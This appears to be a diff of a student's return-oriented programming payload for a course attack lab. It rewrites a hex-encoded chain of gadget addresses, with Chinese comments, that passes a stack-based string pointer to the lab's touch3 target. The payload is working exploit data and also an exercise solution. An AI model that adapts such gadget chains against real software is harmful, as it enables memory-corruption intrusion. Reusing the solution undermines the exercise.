@@ -5,15 +5,13 @@
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
-a1 19 40 00 00 00 00 00 /* 0x4019a1: add $0x8,%rsp; retq  存数据的空间 */
-37 32 33 32 36 39 39 32
-11 1a 40 00 00 00 00 00 /* 0x401a11: mov %rsp,%rax; retq  存rsp，希望-16 */
-da 19 40 00 00 00 00 00 /* 0x4019da: xchg %eax,%ecx; retq  把eax和ecx交换 */
-dd 19 40 00 00 00 00 00 /* 0x4019dd: pop %rax; nop; nop; retq  任意改rax */
-F0 FF FF FF FF FF FF FF /* -16，注意是64位补码 */
-a9 1a 40 00 00 00 00 00 /* 0x401aa9: mov %ecx,%esi; retq $0xc7c3  改esi，现在esi存旧rsp */
+11 1a 40 00 00 00 00 00 /* 0x401a11: mov %rsp,%rax; retq  存rsp，希望+0x40 */
 b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq  只有这一个用来改rdi */
+dd 19 40 00 00 00 00 00 /* 0x4019dd: pop %rax; nop; nop; retq  任意改rax */
+40 00 00 00 00 00 00 00 /* 0x40，注意是64位补码 */
+da 19 40 00 00 00 00 00 /* 0x4019da: xchg %eax,%ecx; retq  把eax和ecx交换 */
+7f 1a 40 00 00 00 00 00 /* 0x401a7f: mov %ecx,%esi; js 0x401a4c <setval_313>; retq  改esi，现在esi存0x40 */
 e8 19 40 00 00 00 00 00 /* 0x4019e8: lea (%rdi,%rsi,1),%rax; retq  用来做加法 */
 b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq  只有这一个用来改rdi */
 09 19 40 00 00 00 00 00 /* 用来调用touch3 */
-b1 19 40 00 00 00 00 00 /* 0x4019b1: nop; retq  垃圾 */
+37 32 33 32 36 39 39 32
